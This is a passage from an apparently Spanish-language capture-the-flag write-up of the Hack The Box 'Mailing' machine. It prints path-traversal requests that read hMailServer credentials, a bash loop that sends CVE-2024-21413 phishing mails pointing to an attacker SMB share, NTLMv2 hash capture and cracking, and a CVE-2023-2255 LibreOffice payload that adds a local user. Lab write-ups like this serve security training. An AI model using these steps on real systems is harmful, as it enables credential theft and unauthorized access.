</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://mailing.htb/</span>
</span></span><span class=line><span class=cl><span class=n>Dnt</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Dest</span><span class=o>:</span> <span class=l>document</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Mode</span><span class=o>:</span> <span class=l>navigate</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Site</span><span class=o>:</span> <span class=l>cross-site</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-User</span><span class=o>:</span> <span class=l>?1</span>
</span></span><span class=line><span class=cl><span class=n>Te</span><span class=o>:</span> <span class=l>trailers</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span></code></pre></div><p><img alt="Mailing 5" src=/pentesting/images/Mailing_5.png></p><p>Confirmamos que podemos leer archivos a trav√©s de un <code>LFI</code>.</p><p>Leyendo <a href="https://www.hmailserver.com/documentation/v5.4/?page=reference_inifilesettings" class=external-link target=_blank rel=noopener>archivos de configuraci√≥n de la documentaci√≥n de <code>hMailServer</code></a>, se dice que, por defecto, el programa est√° instalado en <code>C:\Program Files\hMailServer</code>. Adicionalmente, podemos ver la <a href="https://www.hmailserver.com/documentation/v5.4/?page=folderstructure" class=external-link target=_blank rel=noopener>estructura de carpetas de <code>hMailServer</code></a> de la documentaci√≥n tambi√©n. Para resumir, los datos importantes/sensibles deber√≠a estar localizado en un directorio llamado <code>/Bin</code>. Leyendo <a href="https://www.hmailserver.com/documentation/v5.4/?page=ts_start_server" class=external-link target=_blank rel=noopener>la documentaci√≥n &ldquo;Starting the server&rdquo;</a> dice que deber√≠a de existir un archivo llamado <code>hMailServer.INI</code>. Finalmente, leyendo <a href="https://www.hmailserver.com/forum/viewtopic.php?t=33793" class=external-link target=_blank rel=noopener>c√≥mo cambiar la contrase√±a de <code>hMailServer</code></a> podemos ver que este archivo, <code>hMailServer.ini</code>, almacena credenciales. Como se puede ver en la siguiente imagen de ejemplo (la cual se provee en el √∫ltimo link mencionado), muestran que este archivo est√° almacenado en la ruta <code>C:\Program Files\hMailServer\Bin\hMailServer.INI</code>.</p><p><img alt="Mailing 6" src=/pentesting/images/Mailing_6.png></p><p>Intentamos un <code>LFI</code> para leer este archivo:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/download.php?file=\\\..\..\..\Program+Files\\\hMailServer\\\Bin\\\hMailServer.INI</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>mailing.htb</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.5</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://mailing.htb/</span>
</span></span><span class=line><span class=cl><span class=n>Dnt</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Dest</span><span class=o>:</span> <span class=l>document</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Mode</span><span class=o>:</span> <span class=l>navigate</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Site</span><span class=o>:</span> <span class=l>cross-site</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-User</span><span class=o>:</span> <span class=l>?1</span>
</span></span><span class=line><span class=cl><span class=n>Te</span><span class=o>:</span> <span class=l>trailers</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span></code></pre></div><p><img alt="Mailing 7" src=/pentesting/images/Mailing_7.png></p><p>Pero no funciona. No obstante, si cambiamos <code>Program Files</code> a <code>Program Files (x86)</code> s√≠ obtenemos algo:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/download.php?file=\\\..\..\..\Program+Files+(x86)\\\hMailServer\\\Bin\\\hMailServer.INI</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>mailing.htb</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.5</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://mailing.htb/</span>
</span></span><span class=line><span class=cl><span class=n>Dnt</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Dest</span><span class=o>:</span> <span class=l>document</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Mode</span><span class=o>:</span> <span class=l>navigate</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Site</span><span class=o>:</span> <span class=l>cross-site</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-User</span><span class=o>:</span> <span class=l>?1</span>
</span></span><span class=line><span class=cl><span class=n>Te</span><span class=o>:</span> <span class=l>trailers</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span></code></pre></div><p><img alt="Mailing 8" src=/pentesting/images/Mailing_8.png></p><p>Encontramos el hash de una contrase√±a: <code>841bb5acfa6779ae432fd7a4e6600ba7</code> para una variable llamada <code>AdministratorPassword</code>.</p><p>Intentando un <code>Brute Force Password Cracking</code> con la p√°gina <code>Crackstation</code> (<a href=https://crackstation.net/ class=external-link target=_blank rel=noopener>https://crackstation.net/</a>) nos retorna algo:</p><p><img alt="Mailing 9" src=/pentesting/images/Mailing_9.png></p><p>Obtenemos una contrase√±a: <code>homenetworkingadministrator</code>.</p><p>Buscando por exploits para <code>hMailServer</code> nos lleva a la vulnerabilidad <a href=https://nvd.nist.gov/vuln/detail/CVE-2024-21413 class=external-link target=_blank rel=noopener>CVE-2024-21413</a>. Esta vulnerabilidad no es para <code>hMailServer</code> en s√≠, sino que es para <code>Microsoft Outlook</code> <code>Remote Code Execution</code> (<code>RCE</code>), aunque aplica para mails. Buscando por una <code>Proof of concept</code> para esta vulnerabilidad encontramos <a href=https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability class=external-link target=_blank rel=noopener>este repositorio de Github</a>. B√°sicamente, √©ste nos permitiria extraer el hash <code>NTLMv2</code> de cualquier usuario que abra el mail malicioso (y si es que su versi√≥n de <code>Outlook</code> se encuentra desactualizada). Para esto, simplemente empezamos un listener con la herramienta <code>Responder</code> antes de empezar con el ataque:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo responder -I tun0 -wvd
</span></span></span></code></pre></div><p>Como sea, todav√≠a no tenemos usuarios. Para ver si podemos obtenerlos, decido volver al sitio web. All√≠ podemos ver 3 potenciales usuarios:</p><p><img alt="Mailing 10" src=/pentesting/images/Mailing_10.png></p><p>Creo un archivo de estos potenciales usuarios, donde la primera columna es el primer nombre de la persona y la segunda columna es su apellido:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat team_names.txt
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Ruy Alonso
</span></span></span><span class=line><span class=cl><span class=go>Maya Bendito
</span></span></span><span class=line><span class=cl><span class=go>Gregory Smith
</span></span></span></code></pre></div><p>Hace ya un tiempo atr√°s, cre√© un script en <code>Python</code> (el cual puede ser descargado desde <a href=https://github.com/gunzf0x/HackTools/tree/main/CreatePotentialUsernames class=external-link target=_blank rel=noopener>mi repositorio</a>) el cual crea potenciales usuarios basados en una lista como la que hemos generado.</p><p>Corri√©ndolo crea una lista llamada <code>potential_usernames.txt</code> en el directorio actual de trabajo:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 ~/HackTools/CreatePotentialUsernames/create_potential_usernames.py -l team_names.txt
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] Total number of persons: 3
</span></span></span><span class=line><span class=cl><span class=go>[+] Total combinations/potential users added: 24
</span></span></span><span class=line><span class=cl><span class=go>[+] Data saved as &#39;/home/gunzf0x/HTB/HTBMachines/Easy/Mailing/content/potential_users.txt&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ cat potential_users.txt | head -n 5
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>ralonso
</span></span></span><span class=line><span class=cl><span class=go>rualonso
</span></span></span><span class=line><span class=cl><span class=go>r.alonso
</span></span></span><span class=line><span class=cl><span class=go>ru.alonso
</span></span></span><span class=line><span class=cl><span class=go>ruyalonso
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>Ahora, usando el exploit de <code>CVE-2024-21413</code>, enviamos m√∫ltiples mails en un oneliner de <code>Bash</code>. Dado que hemos encontrado el valor de la variable <code>AdministratorPassword</code> del archivo <code>hMailServer.INI</code>, asumo que el usuario se llama <code>administrator</code> (y, por ende, su email es <code>administrator@mailing.htb</code>) basados en <a href=https://afterlogic.com/docs/webmail-pro-net/integration/integration-with-hmailserver class=external-link target=_blank rel=noopener>este post</a>. Es as√≠ que enviamos m√∫ltiples mails como el usuario <code>administrator@mailing.htb</code> (lo cual en un entorno real har√≠a que el ataque sea mucho menos sospechoso) con su contrase√±a:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ for user in $(cat potential_users.txt); do python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password &#39;homenetworkingadministrator&#39; --sender administrator@mailing.htb --recipient &#34;${user}@mailing.htb&#34; --url &#34;\\10.10.16.6\meetings&#34; --subject &#34;Urgent meeting&#34; | grep -vE &#39;CVE-2024-21413|Alexander Hagenah&#39;; echo &#34;[+] Email sent to &#39;${user}@mailing.htb&#39;&#34;; done
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚úÖ Email sent successfully.
</span></span></span><span class=line><span class=cl><span class=go>[+] Email sent to &#39;ralonso@mailing.htb&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚úÖ Email sent successfully.
</span></span></span><span class=line><span class=cl><span class=go>[+] Email sent to &#39;rualonso@mailing.htb&#39;
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>‚úÖ Email sent successfully.
</span></span></span><span class=line><span class=cl><span class=go>[+] Email sent to &#39;gregory.smith@mailing.htb&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚úÖ Email sent successfully.
</span></span></span><span class=line><span class=cl><span class=go>[+] Email sent to &#39;gregory@mailing.htb&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>Luego de unos segundos, obtenemos un hash <code>NTLMv2</code> en <code>Responder</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo responder -I tun0
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>[+] Listening for events...
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[SMB] NTLMv2-SSP Client   : 10.10.11.14
</span></span></span><span class=line><span class=cl><span class=go>[SMB] NTLMv2-SSP Username : MAILING\maya
</span></span></span><span class=line><span class=cl><span class=go>[SMB] NTLMv2-SSP Hash     : maya::MAILING:6c10dd8070e57430:137948D065440DF9AC802EB0284E2129:01010000000000000083A79E45B5DA019057A551906D004C0000000002000800520055004B004A0001001E00570049004E002D005400360045004300560033004400320041004700440004003400570049004E002D00540036004500430056003300440032004100470044002E00520055004B004A002E004C004F00430041004C0003001400520055004B004A002E004C004F00430041004C0005001400520055004B004A002E004C004F00430041004C00070008000083A79E45B5DA010600040002000000080030003000000000000000000000000020000073387648E67CA5AB00CB5880ADB0D42E7453C4DD8074F6F77F09272FB7F09CF80A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0036000000000000000000
</span></span></span><span class=line><span class=cl><span class=go>[*] Skipping previously captured hash for MAILING\maya
</span></span></span><span class=line><span class=cl><span class=go>[*] Skipping previously captured hash for MAILING\maya
</span></span></span><span class=line><span class=cl><span class=go>[*] Skipping previously captured hash for MAILING\maya
</span></span></span><span class=line><span class=cl><span class=go>[*] Skipping previously captured hash for MAILING\maya
</span></span></span><span class=line><span class=cl><span class=go>[*] Skipping previously captured hash for MAILING\maya
</span></span></span><span class=line><span class=cl><span class=go>[*] Skipping previously captured hash for MAILING\maya
</span></span></span></code></pre></div><p>Guardo este hash en un archivo llamado <code>maya_hash</code>, e intento, de nuevo, un <code>Brute Force Password Cracking</code> con <code>JohnTheRipper</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ john --wordlist=/usr/share/wordlists/rockyou.txt maya_hash
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Using default input encoding: UTF-8
</span></span></span><span class=line><span class=cl><span class=go>Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
</span></span></span><span class=line><span class=cl><span class=go>Will run 5 OpenMP threads
</span></span></span><span class=line><span class=cl><span class=go>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
</span></span></span><span class=line><span class=cl><span class=go>m4y4ngs4ri       (maya)
</span></span></span><span class=line><span class=cl><span class=go>1g 0:00:00:20 DONE (2024-06-02 23:43) 0.04901g/s 290886p/s 290886c/s 290886C/s m5681687..m3skl3s
</span></span></span><span class=line><span class=cl><span class=go>Use the &#34;--show --format=netntlmv2&#34; options to display all of the cracked passwords reliably
</span></span></span><span class=line><span class=cl><span class=go>Session completed.
</span></span></span></code></pre></div><p>Tenemos credenciales: <code>maya:m4y4ngs4ri</code></p><p>Reviso si me puedo conectar con estas credenciales a trav√©s de <code>WinRM</code> con la herramienta <code>NetExec</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec winrm 10.10.11.14 -u &#39;maya&#39; -p &#39;m4y4ngs4ri&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>WINRM       10.10.11.14     5985   MAILING          [*] Windows 10 / Server 2019 Build 19041 (name:MAILING) (domain:MAILING)
</span></span></span><span class=line><span class=cl><span class=go>WINRM       10.10.11.14     5985   MAILING          [+] MAILING\maya:m4y4ngs4ri (Pwn3d!)
</span></span></span></code></pre></div><p>y podemos.</p><p>Me logueo a trav√©s de <code>evil-winrm</code> en la m√°quina v√≠ctima como el usuario <code>maya</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ evil-winrm -i 10.10.11.14 -u &#39;maya&#39; -p &#39;m4y4ngs4ri&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Evil-WinRM shell v3.5
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Info: Establishing connection to remote endpoint
</span></span></span><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\maya\Documents&gt;whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>mailing\maya
</span></span></span></code></pre></div><p>De donde podemos obtener la flag de usuario en el Escritorio del usuario <code>maya</code>.</p><hr><h2 id=nt-auhoritysystem---administrator>NT Auhority/System - Administrator
<a class=heading-link href=#nt-auhoritysystem---administrator><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p>Si revisamos qu√© softwares tiene instalada la m√°quina v√≠ctima, podemos ver <code>LibreOffice</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\maya\Documents&gt; ls C:\&#39;program files&#39;\
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>    Directory: C:\program files
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Mode                 LastWriteTime         Length Name
</span></span></span><span class=line><span class=cl><span class=go>----                 -------------         ------ ----
</span></span></span><span class=line><span class=cl><span class=go>d-----         2/27/2024   5:30 PM                Common Files
</span></span></span><span class=line><span class=cl><span class=go>d-----          3/3/2024   4:40 PM                dotnet
</span></span></span><span class=line><span class=cl><span class=go>d-----          3/3/2024   4:32 PM                Git
</span></span></span><span class=line><span class=cl><span class=go>d-----         4/29/2024   6:54 PM                Internet Explorer
</span></span></span><span class=line><span class=cl><span class=go>d-----          3/4/2024   6:57 PM                LibreOffice
</span></span></span><span class=line><span class=cl><span class=go>d-----          3/3/2024   4:06 PM                Microsoft Update Health Tools
</span></span></span><span class=line><span class=cl><span class=go>d-----         12/7/2019  10:14 AM                ModifiableWindowsApps
</span></span></span><span class=line><span class=cl><span class=go>d-----         2/27/2024   4:58 PM                MSBuild
</span></span></span><span class=line><span class=cl><span class=go>d-----         2/27/2024   5:30 PM                OpenSSL-Win64
</span></span></span><span class=line><span class=cl><span class=go>d-----         3/13/2024   4:49 PM                PackageManagement
</span></span></span><span class=line><span class=cl><span class=go>d-----         2/27/2024   4:58 PM                Reference Assemblies
</span></span></span><span class=line><span class=cl><span class=go>d-----         3/13/2024   4:48 PM                RUXIM
</span></span></span><span class=line><span class=cl><span class=go>d-----         2/27/2024   4:32 PM                VMware
</span></span></span><span class=line><span class=cl><span class=go>d-----          3/3/2024   5:13 PM                Windows Defender
</span></span></span><span class=line><span class=cl><span class=go>d-----         4/29/2024   6:54 PM                Windows Defender Advanced Threat Protection
</span></span></span><span class=line><span class=cl><span class=go>d-----          3/3/2024   5:13 PM                Windows Mail
</span></span></span><span class=line><span class=cl><span class=go>d-----          3/3/2024   5:13 PM                Windows Media Player
</span></span></span><span class=line><span class=cl><span class=go>d-----         4/29/2024   6:54 PM                Windows Multimedia Platform
</span></span></span><span class=line><span class=cl><span class=go>d-----         2/27/2024   4:26 PM                Windows NT
</span></span></span><span class=line><span class=cl><span class=go>d-----          3/3/2024   5:13 PM                Windows Photo Viewer
</span></span></span><span class=line><span class=cl><span class=go>d-----         4/29/2024   6:54 PM                Windows Portable Devices
</span></span></span><span class=line><span class=cl><span class=go>d-----         12/7/2019  10:31 AM                Windows Security
</span></span></span><span class=line><span class=cl><span class=go>d-----         3/13/2024   4:49 PM                WindowsPowerShell
</span></span></span></code></pre></div><p>Esto me trajo recuerdos de Vietnam de la m√°quina <a href=https://app.hackthebox.com/machines/588 class=external-link target=_blank rel=noopener>HackTheBox Office</a>, dado que en aquella vez tuvimos que inyectar un payload por medio de la vulnerabilidad <a href=https://nvd.nist.gov/vuln/detail/CVE-2023-2255 class=external-link target=_blank rel=noopener>CVE-2023-2255</a>, usando <a href=https://github.com/elweth-sec/CVE-2023-2255 class=external-link target=_blank rel=noopener>este exploit</a>. Repetir√© eso. Clono el repositorio y, luego, genero un simple payload:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ git clone https://github.com/elweth-sec/CVE-2023-2255.git
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Cloning into &#39;CVE-2023-2255&#39;...
</span></span></span><span class=line><span class=cl><span class=go>remote: Enumerating objects: 10, done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Counting objects: 100% (10/10), done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Compressing objects: 100% (8/8), done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Total 10 (delta 2), reused 5 (delta 0), pack-reused 0
</span></span></span><span class=line><span class=cl><span class=go>Receiving objects: 100% (10/10), 8.47 KiB | 456.00 KiB/s, done.
</span></span></span><span class=line><span class=cl><span class=go>Resolving deltas: 100% (2/2), done.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ cd CVE-2023-2255
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ python3 CVE-2023-2255.py --cmd &#39;net user gunzf0x gunzf0x123$ /add&#39; --output &#39;adduser.odt&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>File adduser.odt has been created !
</span></span></span></code></pre></div><p>donde <code>10.10.16.6</code> es mi IP de atacante y <code>443</code> es el puerto en el cual me pondr√© en escucha con <code>netcat</code>. Aqu√≠ introduzco un payload el cual crear√° un usuario con credenciales <code>gunzf0x:gunzf0x123$</code>.</p><p>Subo el archivo <code>.odt</code> malicioso a la m√°quina v√≠ctima usando el comando <code>upload</code> de <code>evil-winrm</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\maya\Documents&gt; upload adduser.odt
</span></span></span></code></pre></div><p>Una vez el archivo ha sido subido a la m√°quina v√≠ctima, ejecuto, por ejemplo, el payload corriendo:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\maya\Documents&gt; Start-Process &#34;C:\Program Files\LibreOffice\program\soffice.exe&#34; -ArgumentList &#34;C:\Users\maya\Documents\adduser.odt&#34;
</span></span></span></code></pre></div><p>Pero no ocurre nada.</p><p>Por lo que existe la opci√≥n de que el usuario que corre el payload no tiene los privilegios suficientes para crear un nuevo usuario.</p><p>Analizando diferentes directorios, en <code>C:\</code> puedo ver una carpeta llamada <code>Important Documents</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\&gt; ls C:\
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>    Directory: C:\
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Mode                 LastWriteTime         Length Name
</span></span></span><span class=line><span class=cl><span class=go>----                 -------------         ------ ----
</span></span></span><span class=line><span class=cl><span class=go>d-----          6/3/2024   6:38 AM                Important Documents
</span></span></span><span class=line><span class=cl><span class=go>d-----         2/28/2024   8:49 PM                inetpub
</span></span></span><span class=line><span class=cl><span class=go>d-----         12/7/2019  10:14 AM                PerfLogs
</span></span></span><span class=line><span class=cl><span class=go>d-----          3/9/2024   1:47 PM                PHP
</span></span></span><span class=line><span class=cl><span class=go>d-r---         3/13/2024   4:49 PM                Program Files
</span></span></span><span class=line><span class=cl><span class=go>d-r---         3/14/2024   3:24 PM                Program Files (x86)
</span></span></span><span class=line><span class=cl><span class=go>d-r---          3/3/2024   4:19 PM                Users
</span></span></span><span class=line><span class=cl><span class=go>d-----          6/3/2024   6:40 AM                Windows
</span></span></span><span class=line><span class=cl><span class=go>d-----         4/12/2024   5:54 AM                wwwroot
</span></span></span></code></pre></div><p>Reviso sus permisos con <code>icacls</code>, donde veo que puedo subir archivos all√≠ como el usuario <code>maya</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\&gt; icacls &#39;C:\Important Documents&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Important Documents MAILING\maya:(OI)(CI)(M)
</span></span></span><span class=line><span class=cl><span class=go>                       BUILTIN\Administradores:(I)(OI)(CI)(F)
</span></span></span><span class=line><span class=cl><span class=go>                       NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
</span></span></span><span class=line><span class=cl><span class=go>                       BUILTIN\Usuarios:(I)(OI)(CI)(RX)
</span></span></span><span class=line><span class=cl><span class=go>                       NT AUTHORITY\Usuarios autentificados:(I)(M)
</span></span></span><span class=line><span class=cl><span class=go>                       NT AUTHORITY\Usuarios autentificados:(I)(OI)(CI)(IO)(M)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Successfully processed 1 files; Failed processing 0 files
</span></span></span></code></pre></div><p>De manera que decido copiar el archivo <code>.odt</code> malicioso en este directorio:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\maya\Documents&gt; cmd.exe /c copy C:\Users\maya\Documents\adduser.odt &#39;C:\Important Documents\adduser.odt&#39;
</span></span></span></code></pre></div><p>Luego de algunos segundos, si chequeamos usuarios con el comando <code>net user</code>, nuestro usuario agregado est√° all√≠:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\maya\Documents&gt; net user
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>User accounts for \\
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>-------------------------------------------------------------------------------
</span></span></span><span class=line><span class=cl><span class=go>Administrador            DefaultAccount           gunzf0x
</span></span></span><span class=line><span class=cl><span class=go>Invitado                 localadmin               maya
</span></span></span><span class=line><span class=cl><span class=go>WDAGUtilityAccount
</span></span></span><span class=line><span class=cl><span class=go>The command completed with one or more errors.
</span></span></span></code></pre></div><p>De manera que ha sido creado. Adem√°s, el archivo <code>.odt</code> que estaba en el directorio <code>C:\Important Documents\</code> es eliminado.</p><p>Tomando ventaja del hecho de que ya hemos creado un usuario, tratar√© de agregar a √©ste al grupo <code>Administrators</code>. Chequeando al usuario <code>Administrador</code> (<code>Administrator</code> en espa√±ol), √©ste pertenece a los grupos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\maya\Documents&gt; net user Administrador
